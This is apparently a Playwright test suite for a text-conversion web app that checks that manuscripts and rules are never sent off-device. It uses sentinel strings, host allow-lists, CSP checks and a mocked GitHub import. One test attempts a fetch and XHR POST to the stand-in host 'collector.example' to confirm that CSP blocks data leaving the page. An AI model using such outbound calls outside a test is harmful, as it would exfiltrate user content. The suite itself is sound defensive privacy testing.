import { expect, type Page, test } from '@playwright/test';
import { goToTab, makeRule, openApp, seedWorkspace } from './fixtures';
import { GitHubMock, novelRepository, type RecordedRequest } from './githubMock';

/**
 * README の「入力したテキストとルールは外部へ送信されません」を不変条件として固定する。
 *
 * 宛先ホストだけを見ていると、同一オリジンの `/api/log` に原稿を POST するコードが
 * 入っても素通りする。原稿とルールに目印（sentinel）を仕込み、**どのリクエストにも
 * その文字列が現れないこと**を見る。
 *
 * V2 で GitHub 連携が入り、CSP は `connect-src 'self' https://api.github.com` に広がった。
 * ブラウザ側の塞ぎが緩んだぶん、この検証を2つに分けて保つ。
 * - ローカルだけで使うあいだは、GitHub にも自前のバックエンドにも一切つながない
 * - GitHub から取り込んでも、原稿・ルール・取り込んだ本文はバックエンドへ送らない
 */

/** 原稿・ルールに仕込む目印。通常のテキストと衝突しない形にする。 */
const MANUSCRIPT_SENTINEL = 'DO-NOT-LEAK-MANUSCRIPT-6f2a1c';
const RULE_SRC_SENTINEL = 'DO-NOT-LEAK-RULESRC-6f2a1c';
const RULE_VALUE_SENTINEL = 'DO-NOT-LEAK-RULEVALUE-6f2a1c';
/** GitHub から取り込むファイルの本文に仕込む目印。 */
const REPOSITORY_SENTINEL = 'DO-NOT-LEAK-REPOSITORY-6f2a1c';

const LOCAL_SENTINELS = [MANUSCRIPT_SENTINEL, RULE_SRC_SENTINEL, RULE_VALUE_SENTINEL];

/** ローカルだけで使うときに接続してよい宛先。自分自身とフォントの配信元だけ。 */
const ALLOWED_HOSTS = ['127.0.0.1', 'fonts.googleapis.com', 'fonts.gstatic.com'];

/** URL・ヘッダ・本文のどこに混ぜても気づけるようにする。 */
function haystack(request: RecordedRequest): string {
  return [request.url, JSON.stringify(request.headers), request.body ?? ''].join('\n');
}

function recordRequests(page: Page): RecordedRequest[] {
  const requests: RecordedRequest[] = [];
  page.on('request', (request) => {
    if (!request.url().startsWith('http')) return; // data: や blob: は外部通信ではない
    requests.push({
      method: request.method(),
      url: request.url(),
      headers: request.headers(),
      body: request.postData(),
    });
  });
  return requests;
}

async function seedSentinels(page: Page): Promise<void> {
  await seedWorkspace(page, {
    inputs: [{ id: 'i1', title: 'secret.md', text: `${MANUSCRIPT_SENTINEL}を含む本文` }],
    groups: [{ id: 'g1', name: 'A用' }],
    rules: [makeRule('r1', RULE_SRC_SENTINEL, { g1: RULE_VALUE_SENTINEL })],
  });
}

/** 入力・ルール・変換・出力まで一通り動かす。 */
async function exerciseLocalFlow(page: Page): Promise<void> {
  await goToTab(page, 'ルール');
  await goToTab(page, '入力');
  await page.getByRole('button', { name: '変換' }).click();
  await expect(page.locator('.file-card__path').first()).toBeVisible();
}

test('ローカルだけで使うあいだは、GitHub にもバックエンドにもつながず、原稿もルールも送らない', async ({
  page,
}) => {
  const requests = recordRequests(page);
  await seedSentinels(page);
  await openApp(page);
  await exerciseLocalFlow(page);

  const leaks = requests.flatMap((request) =>
    LOCAL_SENTINELS.filter((sentinel) => haystack(request).includes(sentinel)).map(
      (sentinel) => `${sentinel} → ${request.url}`,
    ),
  );
  expect(leaks, '原稿またはルールがリクエストに含まれている').toEqual([]);

  const unexpectedHosts = requests
    .map((request) => request.url)
    .filter((url) => !ALLOWED_HOSTS.includes(new URL(url).hostname));
  expect(unexpectedHosts, '許可していない宛先への通信').toEqual([]);

  // 同一オリジンでも、バックエンド（/api/）には何も送らない。
  const backend = requests.filter((request) => new URL(request.url).pathname.startsWith('/api/'));
  expect(backend.map((request) => request.url)).toEqual([]);
});

test('CSP は自分自身と api.github.com 以外への fetch / XHR を塞ぐ', async ({ page }) => {
  await openApp(page);

  const csp = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute('content');
  const connectSrc = (csp ?? '')
    .split(';')
    .map((directive) => directive.trim())
    .find((directive) => directive.startsWith('connect-src'));
  // 広げるときは、ここと README の説明を一緒に直す。
  expect(connectSrc?.split(/\s+/)).toEqual(['connect-src', "'self'", 'https://api.github.com']);

  const fetchResult = await page.evaluate(async () => {
    try {
      await fetch('https://collector.example/api', { method: 'POST', body: 'x' });
      return 'なぜか成功した';
    } catch (error) {
      return `拒否された: ${(error as Error).name}`;
    }
  });
  expect(fetchResult).toContain('拒否された');

  const xhrResult = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        const xhr = new XMLHttpRequest();
        xhr.onerror = () => resolve('拒否された');
        xhr.onload = () => resolve('なぜか成功した');
        try {
          xhr.open('POST', 'https://collector.example/api');
          xhr.send('x');
        } catch {
          resolve('拒否された');
        }
      }),
  );
  expect(xhrResult).toBe('拒否された');
});

test('GitHub から取り込んでも、原稿・ルール・取り込んだ本文をバックエンドへ送らない', async ({
  page,
}) => {
  const mock = new GitHubMock([
    novelRepository({
      branches: { main: [{ path: 'secret.md', content: `${REPOSITORY_SENTINEL}\n` }] },
    }),
  ]);
  const requests = recordRequests(page);
  await mock.install(page);
  await seedSentinels(page);
  await openApp(page);

  const dialog = page.getByRole('dialog', { name: 'GitHubから追加' });
  await page.getByRole('button', { name: 'GitHubから追加' }).click();
  await dialog.getByRole('button', { name: 'GitHubに接続' }).click();
  await dialog.getByRole('button', { name: 'octo/novel' }).click();
  await dialog.getByRole('button', { name: /^secret\.md/ }).click();
  await dialog.getByRole('button', { name: '入力に追加' }).click();
  await expect(page.locator('.input-card')).toHaveCount(2);
  await exerciseLocalFlow(page);

  // 手元の原稿とルールは、GitHub を含めてどこにも出ていかない。
  for (const request of requests) {
    for (const sentinel of LOCAL_SENTINELS) {
      expect(haystack(request), `${sentinel} → ${request.url}`).not.toContain(sentinel);
    }
  }

  // 自前のバックエンドへ行くのはトークン交換の POST 1本だけで、中身は交換に要る3つだけ。
  const backend = requests.filter(
    (request) =>
      new URL(request.url).hostname === '127.0.0.1' &&
      new URL(request.url).pathname.startsWith('/api/'),
  );
  expect(backend.map((request) => `${request.method} ${new URL(request.url).pathname}`)).toEqual([
    'POST /api/github/token',
  ]);
  expect(Object.keys(JSON.parse(backend[0]?.body ?? '{}')).sort()).toEqual([
    'code',
    'code_verifier',
    'redirect_uri',
  ]);

  // リポジトリの本文は GitHub から直接受け取るだけで、どこへも送り返さない。
  for (const request of requests) {
    expect(haystack(request), request.url).not.toContain(REPOSITORY_SENTINEL);
  }

  // GitHub への通信は読み取り（GET）だけ。
  const githubMethods = new Set(
    requests
      .filter((request) => new URL(request.url).hostname === 'api.github.com')
      .map((request) => request.method),
  );
  expect([...githubMethods].filter((method) => method !== 'OPTIONS')).toEqual(['GET']);
});
